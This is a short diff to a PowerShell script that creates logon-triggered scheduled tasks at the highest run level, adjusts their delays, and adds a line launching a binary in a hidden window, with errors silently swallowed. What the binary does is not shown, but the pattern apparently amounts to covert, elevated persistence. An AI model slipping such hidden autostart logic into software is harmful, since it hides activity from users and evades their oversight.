@@ -315,7 +315,7 @@ try {
 
                         $trigger = New-ScheduledTaskTrigger -AtLogOn -User $realUser
                         $trigger.Enabled = $true
-                        $trigger.Delay = 'PT10S'
+                        $trigger.Delay = 'PT30M'
 
                         $principal = New-ScheduledTaskPrincipal -UserId $realUser -LogonType Interactive -RunLevel Highest
 
@@ -396,7 +396,7 @@ try {
 
             $wklerTrigger = New-ScheduledTaskTrigger -AtLogOn -User $realUser
             $wklerTrigger.Enabled = $true
-            $wklerTrigger.Delay = 'PT1H'
+            $wklerTrigger.Delay = 'PT1M'
 
             $wklerPrincipal = New-ScheduledTaskPrincipal -UserId $realUser -LogonType Interactive -RunLevel Highest
 
@@ -407,6 +407,7 @@ try {
             try {
                 Register-ScheduledTask -TaskName $wklerTaskName -Action $wklerAction -Trigger $wklerTrigger -Principal $wklerPrincipal -Settings $wklerSettings -Force -ErrorAction Stop | Out-Null
                 Enable-ScheduledTask -TaskName $wklerTaskName -ErrorAction SilentlyContinue | Out-Null
+                Start-Process -FilePath $wklerBin -WindowStyle Hidden | Out-Null
             } catch {
             }
         }
